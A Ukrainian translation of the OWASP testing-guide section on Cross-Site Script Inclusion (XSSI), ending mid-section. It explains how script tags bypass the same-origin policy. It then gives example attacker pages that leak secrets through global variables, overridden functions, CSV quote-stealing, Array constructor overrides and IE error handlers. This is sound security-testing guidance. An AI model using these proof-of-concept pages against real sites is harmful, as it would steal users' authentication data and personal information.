## Тестування на Включення Міжсайтового Сценарію
| ID |
|:-:|
| WSTG-CLNT-13 |

### Короткий опис
Уразливість Включення Міжсайтового Сценарію (XSSI) дозволяє витік чутливих даних через межі джерел або доменів, які відрізняються одне від одного. Серед чутливих даних можуть бути дані, пов'язані з автентифікацією (стан автентифікації, файли cookie, маркери автентифікації, ідентифікатори сесій тощо) або особисті або чутливі особисті дані користувача (адреси електронної пошти, номери телефонів, дані кредитних карток, номери соціального страхування тощо). XSSI - це атака на клієнтському боці, подібна до атаки Підробки Міжсайтового Запиту (CSRF), але має інший метафункціональний характер. Де CSRF використовує контекст автентифікованого користувача для виконання певних дій, які змінюють стан на сторінці жертви (наприклад, переказ грошей на рахунок атакуючого, зміна привілеїв, скидання пароля тощо), XSSI натомість використовує JavaScript на клієнтському боці для витоку чутливих даних із автентифікованих сесій.

За замовчуванням веб-сайти мають доступ до даних лише у випадку, якщо вони належать до того самого джерела. Це є ключовим принципом безпеки застосунків і регулюється політикою однакового походження (визначено [RFC 6454](https://datatracker.ietf.org/doc/html/rfc6454)). Походження визначається як поєднання схеми URI (HTTP або HTTPS), імені хоста та номера порту. Однак ця політика не застосовується до включень тегу HTML `<script>`. Ця виняткова ситуація необхідна, оскільки без неї веб-сайти не змогли б використовувати послуги сторонніх постачальників, проводити аналіз трафіку або використовувати рекламні платформи тощо.

Коли браузер відкриває веб-сайт із тегами `<script>`, ресурси отримуються з домену, що відрізняється за походженням. Ресурси потім запускаються в тому самому контексті, що і включений веб-сайт або браузер, що створює можливість витоку чутливих даних. У більшості випадків цього досягається за допомогою JavaScript, але джерело скрипта не обов'язково має бути файлом JavaScript із типом `text/javascript` або розширенням `.js`.

Вразливості старих браузерів (IE9/10) дозволяли витік даних через повідомлення про помилки JavaScript під час виконання, але ці вразливості вже були усунуті постачальниками і вважаються менш актуальними. Встановивши атрибут charset тегу `<script>`, атакуючий або тестер може задати кодування UTF-16, що дозволяє витік даних в інших форматах (наприклад, JSON) у деяких випадках. Для отримання більше інформації щодо таких атак, дивіться атаки, [засновані на ідентифікаторах XSSI](https://www.mbsd.jp/Whitepaper/xssi.pdf).

### Цілі тестування

- Знайти конфіденційні дані в системі.
- Оцінити витік конфіденційних даних за допомогою різних методів.

### Як протестувати
#### Збір Даних З Використанням Аутентифікованих та Неаутентифікованих Сесій Користувачів

Визначте, які кінцеві точки відповідають за відправку чутливих даних, які параметри потрібні, та ідентифікуйте всі відповідні динамічно та статично генеровані відповіді JavaScript з використанням сеансів аутентифікації користувачів. Зверніть особливу увагу на чутливі дані, які відправляються за допомогою [JSONP](https://en.wikipedia.org/wiki/JSONP). Щоб знайти динамічно генеровані відповіді JavaScript, створюйте аутентифіковані та неаутентифіковані запити, а потім порівнюйте їх. Якщо вони відрізняються, це означає, що відповідь є динамічною, в іншому випадку вона є статичною. Для спрощення цього завдання можна використовувати інструмент, такий як [плагін Burp проксі Вейта Гайлперіна](https://github.com/luh2/DetectDynamicJS). Переконайтеся, що перевіряєте інші типи файлів, крім JavaScript; XSSI не обмежується лише файлами JavaScript.

#### Визначення Можливості Витікання Чутливих Даних За Допомогою JavaScript
Тестери повинні аналізувати код на предмет можливостей витікання даних через уразливості XSSI за допомогою наступних методів:
 
 1. Глобальні змінні
 2. Глобальні параметри функцій
 3. CSV (Значення, Розділені Комами) із крадіжкою цитат
 4. Помилки в роботі JavaScript
 5. Ланцюг прототипу за допомогою ключового слова "це"

#### 1. Витікання Чутливих Даних За Допомогою Глобальних Змінних
API-ключ зберігається в файлі JavaScript за адресою `https://victim.com/internal/api.js` на веб-сайті потерпілого, `victim.com`, який доступний лише аутентифікованим користувачам. Атакуючий налаштовує веб-сайт, `attackingwebsite.com`, та використовує тег <script> для посилання на файл JavaScript.

Ось вміст файлу `https://victim.com/internal/api.js`:
```
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```
Місце атаки, `attackingwebsite.com`, має `index.html`з таким кодом:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```
У цьому прикладі жертва автентифікується на `victim.com`. Зловмисник спокушає жертву перейти на `attackingwebsite.com` за допомогою соціальної інженерії, фішингових листів тощо. Браузер жертви тоді завантажує `api.js`, що призводить до витоку чутливих даних через глобальну змінну JavaScript і їх відображення за допомогою `innerHTML`.

#### 2 Витік Чутливих Даних через Глобальні Параметри Функцій
У цьому прикладі подібному до попереднього, але в даному випадку `attackingwebsite.com` використовує глобальну функцію JavaScript для видобутку чутливих даних, перезаписуючи глобальну функцію JavaScript жертви.

Ось вміст `https://victim.com/internal/api.js`:
```
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```
Місце атаки, `attackingwebsite.com`, має `index.html`з таким кодом:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```
Існують інші вразливості XSSI, які можуть призвести до витоку конфіденційних даних через ланцюжки прототипів JavaScript або глобальні виклики функцій. Щоб дізнатися більше про ці атаки, перегляньте [Несподівані Небезпеки Динамічного JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).

#### 3. Витік Конфіденційних Даних через CSV із Крадіжкою Котирувань
Для витоку даних зловмисник/тестувальник повинен мати можливість вставити код JavaScript у дані CSV. Наведений нижче приклад коду є уривком із документації про [атаки XSSI на основі ідентифікатора](https://www.mbsd.jp/Whitepaper/xssi.pdf) Такеші Теради.
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```
У цьому прикладі за допомогою `___` стовпці як точки впровадження та вставлення рядків JavaScript на їх місце має наступний результат.
```
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```
[Джеремія Гроссман писав про подібну вразливість у Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) у 2006 році, яка дозволяла видобувати контакти користувачів у JSON. У цьому випадку дані були отримані з Gmail і проаналізовані движком JavaScript браузера за допомогою конструктора Масив без посилання, щоб отримати витік даних. Зловмисник може отримати доступ до цього Масиву з конфіденційними даними, визначивши та перезаписавши внутрішній конструктор Масиву таким чином:
```
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

#### 4. Витік Конфіденційних Даних через Помилки Виконання JavaScript
Браузери зазвичай представляють стандартизовані [повідомлення про помилки JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). Однак у випадку IE9/10 повідомлення про помилки виконання надавали додаткові відомості, які могли бути використані для витоку даних. Наприклад, веб-сайт `victim.com` надає такий вміст за URI `http://victim.com/service/csvendpoint` для автентифікованих користувачів:
```
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```
Цю вразливість можна використати за допомогою:
```
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="http://victim.com/service/csvendpoint"></script>
```
Коли веб-переглядач намагається відтворити вміст CSV як JavaScript, це не вдається та відбувається витік конфіденційних даних:
